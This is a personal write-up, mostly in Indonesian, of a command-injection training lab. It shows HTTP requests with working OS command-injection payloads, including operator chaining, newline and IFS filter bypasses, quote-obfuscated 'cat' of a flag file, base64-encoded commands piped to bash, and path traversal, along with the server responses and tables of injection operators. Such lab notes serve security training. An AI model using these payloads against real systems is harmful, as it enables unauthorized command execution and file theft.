
# Detection 

soal 1 : 

di sini saya cara solve nya, yang pertama saya hapus pattern nya lewat inspect dan saya menginputkan sebuah payload
```bash
127.0.0.1;ls
```

maka akan muncul output
```bash
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.015 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.015/0.015/0.015/0.000 ms
index.php
style.css
```


	jawaban : Please match the requested format.

# Injecting Commands

solve soal 2: 

jawaban

CTRL + u, cek baris code pattern input


# payload

| **Tipe Injeksi**                               | **Operator**                                      |
| ---------------------------------------------- | ------------------------------------------------- |
| Injeksi SQL                                    | `'` `,` `;` `--` `/* */`                          |
| Injeksi Perintah                               | `;` `&&`                                          |
| Injeksi LDAP                                   | `*` `(` `)` `&` `\|`                              |
| Injeksi XPath                                  | `'` `or` `and` `not` `substring` `concat` `count` |
| Injeksi Perintah OS                            | `;` `&` `\|`                                      |
| Injeksi Kode                                   | `'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`  |
| Penjelajahan Direktori/Penjelajahan Jalur File | `../` `..\\` `%00`                                |
| Injeksi Objek                                  | `;` `&` `\|`                                      |
| Injeksi XQuery                                 | `'` `;` `--` `/* */`                              |
| Injeksi Shellcode                              | `\x` `\u` `%u` `%n`                               |
| Injeksi Tajuk                                  | `\n` `\r\n` `\t` `%0d` `%0a` `%09`                |




# Other Injection Operators


solve soal 3: 

```json
POST / HTTP/1.1
Host: 94.237.49.212:31315
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.49.212:31315/
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Origin: http://94.237.49.212:31315
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=0, i

ip=127.0.0.1%7cwhoami
```

saya harus decode ke url

# Identifying Filters

solve soal 4: 

answer: new-line

```json
POST / HTTP/1.1
Host: 94.237.49.212:47980
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.49.212:47980/
Content-Type: application/x-www-form-urlencoded
Content-Length: 61
Origin: http://94.237.49.212:47980
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=0, i

ip=127.0.0.1${LS_COLORS:10:1}%0a{ls,-al}${IFS}${PATH:0:1}home
```

response

```json
HTTP/1.1 200 OK
Date: Sat, 24 Aug 2024 06:24:39 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1241
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>Host Checker</title>
  <link rel="stylesheet" href="./style.css">

</head>

<body>
  <div class="main">
    <h1>Host Checker</h1>

    <form method="post" action="">
      <label>Enter an IP Address</label>
      <input type="text" name="ip" placeholder="127.0.0.1" pattern="^((\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.){3}(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])$">
      <button type="submit">Check</button>
    </form>

    <p>
    <pre>
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.017 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms
/home:
total 12
drwxr-xr-x 1 root     root     4096 Jul 16  2021 .
drwxr-xr-x 1 root     root     4096 Aug 24 07:11 ..
drwxr-xr-x 1 1nj3c70r 1nj3c70r 4096 Jul 16  2021 1nj3c70r

/home:
total 12
drwxr-xr-x 1 root     root     4096 Jul 16  2021 .
drwxr-xr-x 1 root     root     4096 Aug 24 07:11 ..
drwxr-xr-x 1 1nj3c70r 1nj3c70r 4096 Jul 16  2021 1nj3c70r
</pre>
    </p>

  </div>
  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js'></script>

</body>

</html>
```


# Bypassing Blacklisted Commands

solve soal 5:

```json
POST / HTTP/1.1
Host: 94.237.49.212:47980
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.49.212:47980/
Content-Type: application/x-www-form-urlencoded
Content-Length: 96
Origin: http://94.237.49.212:47980
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=0, i

ip=127.0.0.1${LS_COLORS:10:1}%0ac"a"t${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
```


saya menggunakan karater khusus yaitu "  dan juga bisa ' | bisa juga dengan cmd nl




# Advanced Command Obfuscation

solve soal 6:

```json
POST / HTTP/1.1
Host: 94.237.49.212:47980
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.49.212:47980/
Content-Type: application/x-www-form-urlencoded
Content-Length: 111
Origin: http://94.237.49.212:47980
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=0, i

ip=127.0.0.1%0abash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
```

```bash
┌─[aexon@parrot]─[~]
└──╼ $echo -n "find /usr/share/ | grep root | grep mysql | tail -n 1" | base64
ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=
```

saya pertama encode ke base 64 lalu decode 


## Injection Operators

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | `;`                     | `%3b`                     | Both                                       |
| New Line               | `\n`                    | `%0a`                     | Both                                       |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
| Pipe                   | `\|`                    | `%7c`                     | Both (only second output is shown)         |
| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
| OR                     | `\|`                    | `%7c%7c`                  | Second (only if first fails)               |
| Sub-Shell              | ` `` `                  | `%60%60`                  | Both (Linux-only)                          |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both (Linux-only)                          |


# Skills Assessment


```json
GET /index.php?to=%0abash<<<$(base64%09-d<<<d2hvYW1pCg==)&from=flag.txt&finish=1&move=1 HTTP/1.1
Host: 94.237.59.199:50897
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.59.199:50897/index.php?to=tmp&from=696212415.txt
Connection: close
Cookie: filemanager=413jdmrsi4s22ol9hnbvs9etms
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

ternyata bisa, mari kita buat payload nya

```bash
┌─[✗]─[aexon@parrot]─[~]
└──╼ $echo "cat ../../../../../../flag.txt" | base64
Y2F0IC4uLy4uLy4uLy4uLy4uLy4uL2ZsYWcudHh0Cg==
```



```json
GET /index.php?to=%0abash<<<$(base64%09-d<<<Y2F0IC4uLy4uLy4uLy4uLy4uLy4uL2ZsYWcudHh0Cg==)&from=flag.txt&finish=1&move=1 HTTP/1.1
Host: 94.237.59.199:50897
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.59.199:50897/index.php?to=tmp&from=696212415.txt
Connection: close
Cookie: filemanager=413jdmrsi4s22ol9hnbvs9etms
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```


